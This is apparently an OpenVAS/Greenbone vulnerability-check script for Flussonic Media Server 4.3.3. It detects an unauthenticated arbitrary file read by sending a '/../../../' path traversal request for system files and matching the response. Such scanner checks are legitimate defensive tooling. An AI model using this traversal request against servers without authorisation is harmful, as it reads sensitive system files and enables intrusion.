if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105053" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Flussonic Media Server Multiple Security Vulnerabilities" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-06-30 17:20:40 +0200 (Mon, 30 Jun 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 8080 );
	script_require_keys( "Host/runs_unixoide" );
	script_mandatory_keys( "cowboy/banner" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Jun/167" );
	script_tag( name: "impact", value: "It's possible to read any files/directories from the server (with the
  application's user's permissions) by a simple HTTP GET request." );
	script_tag( name: "vuldetect", value: "Send a HTTP GET request and check the response" );
	script_tag( name: "insight", value: "Flussonic Media Server is prone to a:

  1. Arbitrary File Read (Unauthenticated)

  2. Arbitrary Directory Listing (Authenticated)" );
	script_tag( name: "solution", value: "Update to Flussonic Media Server 4.3.4" );
	script_tag( name: "summary", value: "Flussonic Media Server 4.3.3 Multiple Vulnerabilities" );
	script_tag( name: "affected", value: "Flussonic Media Server 4.3.3" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( tolower( banner ), "server: cowboy" )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/../../../" + file;
	if(buf = http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		req_resp = "Request:\n" + __ka_last_request + "\nResponse:\n" + buf;
		security_message( port: port, data: report, expert_info: req_resp );
		exit( 0 );
	}
}
exit( 99 );

